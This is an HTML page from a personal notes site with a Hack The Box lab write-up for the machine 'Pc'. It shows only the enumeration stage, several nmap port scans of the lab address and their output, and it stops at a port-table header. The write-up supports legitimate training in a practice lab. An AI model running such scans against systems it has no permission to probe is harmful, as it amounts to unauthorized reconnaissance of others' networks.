<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Photobomb" href="../photobomb/photobomb.html" /><link rel="prev" title="Monitors two" href="../monitorstwo/monitorstwo.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Pc - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../medium/administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../easy.html">Easy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="pc.png" src="../../../../_images/pc.png" /></p>
<section id="pc">
<h1>Pc<a class="headerlink" href="#pc" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-21<span class="w"> </span><span class="m">08</span>:49<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.214
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.034s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">999</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.7<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>91bf44edea1e3224301f532cea71e5ef<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>8486a6e204abdff71d456ccf395809de<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>1aa89572515e8e3cf180f542fd0a281c<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">14</span>.76<span class="w"> </span>seconds
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sU<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.udp
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-21<span class="w"> </span><span class="m">08</span>:51<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.214
Host<span class="w"> </span>is<span class="w"> </span>up.
All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>open<span class="p">|</span>filtered<span class="w"> </span>udp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.19<span class="w"> </span>seconds
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.udp
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-21<span class="w"> </span><span class="m">08</span>:51<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.214
Host<span class="w"> </span>is<span class="w"> </span>up.
All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>open<span class="p">|</span>filtered<span class="w"> </span>udp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.19<span class="w"> </span>seconds
<span class="o">[</span>blnkn@Kolossus<span class="o">](</span>main<span class="w"> </span>%<span class="o">=)</span>:~/sec/htb/machines/pc%
<span class="o">[</span>blnkn@Kolossus<span class="o">](</span>main<span class="w"> </span>%<span class="o">=)</span>:~/sec/htb/machines/pc%<span class="w">                                                </span><span class="m">130</span><span class="w"> </span>⨯
<span class="o">[</span>blnkn@Kolossus<span class="o">](</span>main<span class="w"> </span>%<span class="o">=)</span>:~/sec/htb/machines/pc%<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.11.214<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-21<span class="w"> </span><span class="m">08</span>:52<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.214
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.029s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65533</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
